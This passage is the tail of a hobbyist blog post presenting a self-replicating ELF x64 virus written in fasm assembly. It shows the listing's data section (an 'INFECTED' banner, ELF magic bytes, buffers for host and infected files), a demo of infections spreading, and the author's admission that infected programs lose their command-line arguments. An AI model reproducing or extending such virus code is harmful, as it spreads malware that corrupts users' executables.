</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msg</span> db <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5b</span>, <span style="color:#ae81ff">0x5d</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7e</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x7b</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x7d</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x2f</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x5e</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x27</span>, <span style="color:#ae81ff">0x5c</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x7c</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x2c</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x28</span>, <span style="color:#ae81ff">0x5f</span>, <span style="color:#ae81ff">0x29</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x48</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x53</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x49</span>, <span style="color:#ae81ff">0x4e</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x43</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x44</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x21</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x3d</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x0a</span>, <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">msgl</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">$</span><span style="color:#f92672">-</span>msg
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">elfmagic</span> db <span style="color:#ae81ff">0x7f</span>, <span style="color:#ae81ff">0x45</span>, <span style="color:#ae81ff">0x4c</span>, <span style="color:#ae81ff">0x46</span>, <span style="color:#ae81ff">0x00</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">self_size</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">1292</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">max_size</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#ae81ff">4000000</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">struc</span> DIRENT <span style="color:#960050;background-color:#1e0010">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.d_ino</span>          rq <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.d_off</span>          rq <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.d_reclen</span>       rw <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">.d_type</span>         rb <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">label</span> .d_name   <span style="color:#66d9ef">byte</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">}</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">virtual</span> at <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">DIRENT</span> DIRENT
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sizeof.DIRENT</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">$</span> <span style="color:#f92672">-</span> DIRENT
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">end</span> virtual
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">infected</span> rb max_size
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">host</span> rb max_size
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">self</span> rb self_size
</span></span></code></pre></div><p><strong>DEMO</strong>  <br>
Here is the demo showing programs being infected by the virus and then these infected programs spreading
its infection to other clean programs</p>
<p><a href="https://asciinema.org/a/529026"><img src="https://asciinema.org/a/529026.svg" alt="asciicast"></a></p>
<p><em><strong>NOTE:</strong> Although i mentioned that the virus is harmless but during testing i found out that it has bug that
it disables commandline arguments of infected files, which is obviously never will be fixed, thanks to my laziness!</em></p>

    </div>
  </article>

  
  






  <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="furqantariq.github.io/">home</a></li>
         
          <li><a href="furqantariq.github.io/posts">posts</a></li>
         
          <li><a href="furqantariq.github.io/tags">tags</a></li>
        
      </ul>
    </div>

    
    <div id="toc-footer" style="display: none">
      <nav id="TableOfContents"></nav>
    </div>
    

    <div id="share-footer" style="display: none">
      
      <ul>
  
  
    
  
  
  <li>
    <a class="icon" href="http://www.facebook.com/sharer.php?u=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f" aria-label="Facebook">
      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://twitter.com/share?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&text=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Twitter">
      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.linkedin.com/shareArticle?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Linkedin">
      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&is_video=false&description=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Pinterest">
      <i class="fab fa-pinterest fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="mailto:?subject=An%20ELF%20x64%20Virus%20in%20fasm%20assembly&body=Check out this article: furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f" aria-label="Email">
      <i class="fas fa-envelope fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://getpocket.com/save?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Pocket">
      <i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://reddit.com/submit?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&title=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="reddit">
      <i class="fab fa-reddit fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="http://www.tumblr.com/share/link?url=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&name=An%20ELF%20x64%20Virus%20in%20fasm%20assembly&description=Recently%2c%20I%20was%20playing%20around%20with%20flat%20assembler%20and%20i%20needed%20something%20to%20write%20in%20it.%20I%20tried%20%26ldquo%3bHello%20world%26rdquo%3b%20program%20but%20it%20was%20not%20enough.%20I%20believe%20that%20generally%20%26ldquo%3bHello%20world%26rdquo%3b%20programs%20are%20not%20a%20good%20way%20to%20learn%20about%20details%20of%20a%20programming%20language%2c%20especially%20for%20somewhat%20experienced%20programmers.%0aSo%20I%20wrote%20a%20virus%20to%20familiarize%20myself%20to%20it.%20Because%20it%20is%20compact%20and%20has%20a%20everything%20from%20condition%20control%20flows%20to%20loop%20constructs%2c%20not%20just%20printing%20out%20in%20standard%20output%20and%20it%20only%20took%20me%20couple%20of%20hours%20to%20write%20it." aria-label="Tumblr">
      <i class="fab fa-tumblr fa-lg" aria-hidden="true"></i>
    </a>
  </li>
  <li>
    <a class="icon" href="https://news.ycombinator.com/submitlink?u=furqantariq.github.io%2fposts%2felf-x64-virus-fasm%2f&t=An%20ELF%20x64%20Virus%20in%20fasm%20assembly" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2023  Furqan Tariq 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="furqantariq.github.io/">home</a></li>
         
        <li><a href="furqantariq.github.io/posts">posts</a></li>
         
        <li><a href="furqantariq.github.io/tags">tags</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/furqantariq.github.io/js/code-copy.js></script>



  


<script>
  MathJax = {
    tex: {
      inlineMath: [['$', '$'], ['\\(', '\\)']]
    },
    svg: {
      fontCache: 'global'
    }
  };
</script>
<script type="text/javascript" id="MathJax-script" async
  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js">
</script>

</html>
